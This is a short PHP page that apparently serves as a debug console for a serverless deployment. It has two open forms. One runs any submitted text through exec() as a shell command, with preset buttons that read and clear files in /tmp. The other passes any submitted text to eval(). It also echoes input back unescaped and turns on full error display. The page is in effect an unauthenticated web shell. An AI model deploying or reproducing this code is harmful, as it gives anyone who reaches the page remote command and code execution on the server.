<?php
if (isset($_REQUEST['btn']) && strlen($_REQUEST['btn']))
{
	$_REQUEST['shell'] = $_REQUEST['btn'];
}

?>
    <h1>eval()</h1>
    <form method="POST">
        <input type="text" name="eval" value="<?php echo isset($_REQUEST['eval']) ? $_REQUEST['eval'] : ''; ?>" style="width: 800px" />
        <input type="submit">
    </form>
    <h1>system()</h1>
    <form method="POST">
        <input type="text" name="shell" value="<?php echo isset($_REQUEST['shell']) ? $_REQUEST['shell'] : ''; ?>" style="width: 800px" />
        <input type="submit"><br />
        <input type="submit" name="btn" value="ls -la /tmp">
        <input type="submit" name="btn" value="cat /tmp/ld_debug.log">
        <input type="submit" name="btn" value="cat /tmp/php_errors.log">
        <input type="submit" name="btn" value="echo ''> /tmp/serverless.log">
        <input type="submit" name="btn" value="cat /tmp/serverless.log">
    </form>
    <br />
    <br />
<?php

error_reporting(E_ALL);
ini_set('display_errors', 'On');

if (isset($_REQUEST['shell'])) {
	echo '<pre>';
	exec($_REQUEST['shell'] . " 2>&1", $output);
	echo htmlentities(implode("\n", $output));
	echo '</pre>';
}

if (isset($_REQUEST['eval'])) {
	echo $_REQUEST['eval'];
	eval($_REQUEST['eval']);
}

